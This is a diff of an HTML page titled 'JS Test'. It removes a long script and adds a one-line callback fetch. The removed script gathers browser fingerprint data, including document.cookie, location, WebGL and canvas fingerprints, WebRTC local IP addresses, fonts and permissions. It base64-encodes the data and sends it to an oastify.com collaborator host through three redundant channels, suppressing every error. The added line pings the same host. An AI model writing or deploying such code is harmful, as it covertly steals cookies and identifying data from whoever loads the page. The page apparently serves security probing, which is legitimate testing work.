@@ -1,399 +1,45 @@
 <!DOCTYPE html>
+
+
+
 <html>
+
+
 <head>
+
+
     <title>JS Test</title>
+
+
 </head>
+
+
 <body>
+
+
     Testing...
+
+
+
+
+
     <script>
-    (async () => {
-        const sys = {};
 
-        try {
-            // --- Navigator ---
-            const navProps = [
-                'userAgent','appCodeName','appName','appVersion','platform','product','productSub',
-                'vendor','vendorSub','language','languages','cookieEnabled','onLine','hardwareConcurrency',
-                'deviceMemory','maxTouchPoints','doNotTrack','pdfViewerEnabled','webdriver',
-                'buildID','oscpu'
-            ];
-            navProps.forEach(k => {
-                try { sys['nav_'+k] = navigator[k]; } catch(e) {}
-            });
 
-            // Client Hints
-            try {
-                if (navigator.userAgentData) {
-                    sys.uaData = await navigator.userAgentData.getHighEntropyValues([
-                        'platform','platformVersion','architecture','model','uaFullVersion',
-                        'fullVersionList','bitness','wow64','formFactors'
-                    ]);
-                    sys.uaDataMobile = navigator.userAgentData.mobile;
-                    sys.uaDataBrands = navigator.userAgentData.brands;
-                }
-            } catch(e) {}
+    fetch("https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/?fetched_by_js")
 
-            // --- Screen ---
-            ['width','height','availWidth','availHeight','colorDepth','pixelDepth',
-             'availLeft','availTop','orientation'].forEach(k => {
-                try { sys['screen_'+k] = screen[k]; } catch(e) {}
-            });
 
-            // --- Window ---
-            try {
-                sys.window = {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight,
-                    screenX: window.screenX,
-                    screenY: window.screenY,
-                    screenLeft: window.screenLeft,
-                    screenTop: window.screenTop,
-                    devicePixelRatio: window.devicePixelRatio,
-                    length: window.length,
-                    name: window.name,
-                    opener: !!window.opener,
-                    isFramed: window.self !== window.top,
-                    crossOriginIsolated: window.crossOriginIsolated,
-                    closed: window.closed,
-                    isSecureContext: window.isSecureContext,
-                    origin: window.origin
-                };
-                try {
-                    if (window.top.location.href) sys.window.isCrossOriginFramed = false;
-                } catch(e) {
-                    sys.window.isCrossOriginFramed = true;
-                }
-                if (window.visualViewport) {
-                    sys.window.visualViewport = {
-                        width: visualViewport.width,
-                        height: visualViewport.height,
-                        scale: visualViewport.scale,
-                        offsetLeft: visualViewport.offsetLeft,
-                        offsetTop: visualViewport.offsetTop
-                    };
-                }
-            } catch(e) {}
+      .catch(() => {});
 
-            // --- Location ---
-            try {
-                sys.location = {
-                    href: location.href,
-                    protocol: location.protocol,
-                    host: location.host,
-                    hostname: location.hostname,
-                    port: location.port,
-                    pathname: location.pathname,
-                    search: location.search,
-                    hash: location.hash,
-                    origin: location.origin
-                };
-            } catch(e) {}
 
-            // --- Document ---
-            try {
-                sys.document = {
-                    title: document.title,
-                    referrer: document.referrer,
-                    domain: document.domain,
-                    cookie: document.cookie,
-                    lastModified: document.lastModified,
-                    readyState: document.readyState,
-                    characterSet: document.characterSet,
-                    compatMode: document.compatMode,
-                    documentURI: document.documentURI,
-                    baseURI: document.baseURI,
-                    fullscreenEnabled: document.fullscreenEnabled,
-                    pictureInPictureEnabled: document.pictureInPictureEnabled
-                };
-            } catch(e) {}
-
-            // --- Locale / Time ---
-            try {
-                sys.locale = Intl.DateTimeFormat().resolvedOptions();
-                sys.timezoneOffset = new Date().getTimezoneOffset();
-                sys.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                sys.date = new Date().toString();
-            } catch(e) {}
-
-            // --- Plugins & MIME ---
-            try {
-                sys.plugins = Array.from(navigator.plugins || []).map(p => ({
-                    name: p.name,
-                    filename: p.filename,
-                    description: p.description
-                }));
-                sys.pluginsCount = navigator.plugins ? navigator.plugins.length : 0;
-            } catch(e) {}
-            try {
-                sys.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => ({
-                    type: m.type,
-                    description: m.description,
-                    suffixes: m.suffixes
-                }));
-                sys.mimeTypesCount = navigator.mimeTypes ? navigator.mimeTypes.length : 0;
-            } catch(e) {}
-
-            // --- WebGL ---
-            try {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                if (gl) {
-                    const unmasked = {};
-                    try {
-                        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (dbg) {
-                            unmasked.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-                            unmasked.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-                        }
-                    } catch(e) {}
-                    sys.webgl = {
-                        vendor: gl.getParameter(gl.VENDOR),
-                        renderer: gl.getParameter(gl.RENDERER),
-                        version: gl.getParameter(gl.VERSION),
-                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                        unmaskedVendor: unmasked.vendor || null,
-                        unmaskedRenderer: unmasked.renderer || null,
-                        extensions: gl.getSupportedExtensions()
-                    };
-                }
-            } catch(e) {}
-
-            // --- WebGL2 ---
-            try {
-                const c2 = document.createElement('canvas');
-                const gl2 = c2.getContext('webgl2');
-                if (gl2) {
-                    sys.webgl2 = {
-                        version: gl2.getParameter(gl2.VERSION),
-                        vendor: gl2.getParameter(gl2.VENDOR),
-                        renderer: gl2.getParameter(gl2.RENDERER)
-                    };
-                }
-            } catch(e) {}
-
-            // --- Canvas ---
-            try {
-                const c = document.createElement('canvas');
-                const ctx = c.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 2);
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 4, 17);
-                sys.canvas = c.toDataURL();
-            } catch(e) {}
-
-            // --- Performance ---
-            try {
-                sys.performance = {
-                    now: performance.now(),
-                    timeOrigin: performance.timeOrigin
-                };
-                if (performance.memory) {
-                    sys.performance.memory = {
-                        usedJSHeapSize: performance.memory.usedJSHeapSize,
-                        totalJSHeapSize: performance.memory.totalJSHeapSize,
-                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
-                    };
-                }
-            } catch(e) {}
-
-            // --- Connection ---
-            try {
-                const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (c) {
-                    sys.connection = {
-                        effectiveType: c.effectiveType,
-                        downlink: c.downlink,
-                        rtt: c.rtt,
-                        saveData: c.saveData,
-                        type: c.type
-                    };
-                }
-            } catch(e) {}
-
-            // --- Battery ---
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    sys.battery = {
-                        charging: b.charging,
-                        level: b.level,
-                        chargingTime: b.chargingTime,
-                        dischargingTime: b.dischargingTime
-                    };
-                }
-            } catch(e) {}
-
-            // --- Media Devices ---
-            try {
-                const devs = await navigator.mediaDevices.enumerateDevices();
-                sys.mediaDevices = devs.map(d => ({
-                    kind: d.kind,
-                    label: d.label ? '[redacted]' : '',
-                    deviceId: d.deviceId ? d.deviceId.slice(0,8)+'...' : '',
-                    groupId: d.groupId ? d.groupId.slice(0,8)+'...' : ''
-                }));
-                sys.mediaDevicesCount = devs.length;
-            } catch(e) {}
-
-            // --- Permissions ---
-            try {
-                const names = [
-                    'camera','microphone','geolocation','notifications',
-                    'clipboard-read','clipboard-write','persistent-storage'
-                ];
-                sys.permissions = {};
-                for (const n of names) {
-                    try {
-                        const r = await navigator.permissions.query({name: n});
-                        sys.permissions[n] = r.state;
-                    } catch(e) {}
-                }
-            } catch(e) {}
-
-            // --- Storage ---
-            try {
-                if (navigator.storage && navigator.storage.estimate) {
-                    sys.storageEstimate = await navigator.storage.estimate();
-                }
-                sys.localStorageLen = localStorage.length;
-                sys.sessionStorageLen = sessionStorage.length;
-            } catch(e) {}
-
-            // --- History / Workers / etc ---
-            try {
-                sys.historyLength = history.length;
-                sys.serviceWorker = 'serviceWorker' in navigator;
-                sys.sharedWorker = typeof SharedWorker !== 'undefined';
-                sys.indexedDB = 'indexedDB' in window;
-                sys.cacheAPI = 'caches' in window;
-            } catch(e) {}
-
-            // --- Notification permission ---
-            try {
-                sys.notificationPermission = Notification.permission;
-            } catch(e) {}
-
-            // --- Feature detection (shortened for reliability) ---
-            try {
-                sys.features = {
-                    wasm: typeof WebAssembly === 'object',
-                    sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
-                    bigInt: typeof BigInt !== 'undefined',
-                    webGPU: 'gpu' in navigator,
-                    webRTC: 'RTCPeerConnection' in window,
-                    webAudio: 'AudioContext' in window || 'webkitAudioContext' in window,
-                    fileSystemAccess: 'showOpenFilePicker' in window,
-                    bluetooth: 'bluetooth' in navigator,
-                    usb: 'usb' in navigator,
-                    serial: 'serial' in navigator,
-                    hid: 'hid' in navigator
-                };
-            } catch(e) {}
-
-            // --- Media Queries ---
-            try {
-                sys.mediaQueries = {
-                    prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
-                    prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
-                    hover: window.matchMedia('(hover: hover)').matches,
-                    pointer: window.matchMedia('(pointer: coarse)').matches ? 'coarse' :
-                             window.matchMedia('(pointer: fine)').matches ? 'fine' : 'none'
-                };
-            } catch(e) {}
-
-            // --- WebRTC Local IP ---
-            try {
-                const pc = new RTCPeerConnection({iceServers: []});
-                pc.createDataChannel('');
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                sys.webrtc = [];
-                pc.onicecandidate = ice => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    const m = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(ice.candidate.candidate);
-                    if (m) sys.webrtc.push(m[1]);
-                };
-                await new Promise(r => setTimeout(r, 800));
-                pc.close();
-            } catch(e) {}
-
-            // --- AudioContext ---
-            try {
-                const AC = window.AudioContext || window.webkitAudioContext;
-                if (AC) {
-                    const ctx = new AC();
-                    sys.audio = {
-                        sampleRate: ctx.sampleRate,
-                        state: ctx.state,
-                        baseLatency: ctx.baseLatency || null,
-                        maxChannelCount: ctx.destination.maxChannelCount
-                    };
-                    ctx.close();
-                }
-            } catch(e) {}
-
-            // --- Fonts (basic) ---
-            try {
-                const baseFonts = ['monospace', 'sans-serif', 'serif'];
-                const fontList = ['Arial','Arial Black','Calibri','Comic Sans MS','Courier New',
-                                  'Georgia','Impact','Times New Roman','Trebuchet MS','Verdana'];
-                const h = document.createElement('span');
-                h.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
-                h.innerText = 'mmmmmmmmmmlli';
-                document.body.appendChild(h);
-                const defaults = {};
-                baseFonts.forEach(b => { h.style.fontFamily = b; defaults[b] = h.offsetWidth; });
-                sys.detectedFonts = [];
-                fontList.forEach(f => {
-                    let found = false;
-                    baseFonts.forEach(b => {
-                        h.style.fontFamily = `"${f}",${b}`;
-                        if (h.offsetWidth !== defaults[b]) found = true;
-                    });
-                    if (found) sys.detectedFonts.push(f);
-                });
-                document.body.removeChild(h);
-            } catch(e) {}
-
-            // --- Hardware summary ---
-            try {
-                sys.hardware = {
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory,
-                    maxTouchPoints: navigator.maxTouchPoints
-                };
-            } catch(e) {}
-
-        } catch(e) {
-            // completely ignore any top-level error
-        } finally {
-            // === ALWAYS SEND whatever was collected ===
-            try {
-                const json = JSON.stringify(sys, (k, v) => {
-                    if (typeof v === 'function') return undefined;
-                    if (v === undefined) return null;
-                    return v;
-                });
-                const b64 = btoa(unescape(encodeURIComponent(json)));
-                const url = `https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/?data=${encodeURIComponent(b64)}&fetched_by_js=1`;
-
-                // Multiple delivery methods
-                try { fetch(url, {mode: 'no-cors', cache: 'no-store'}); } catch(e) {}
-                try { if (navigator.sendBeacon) navigator.sendBeacon(url); } catch(e) {}
-                try { new Image().src = url; } catch(e) {}
-            } catch(e) {
-                // even the send itself is protected
-            }
-        }
-    })();
     </script>
+
+
+
+
+
 </body>
+
+
 </html>
+0 commit commentsComments
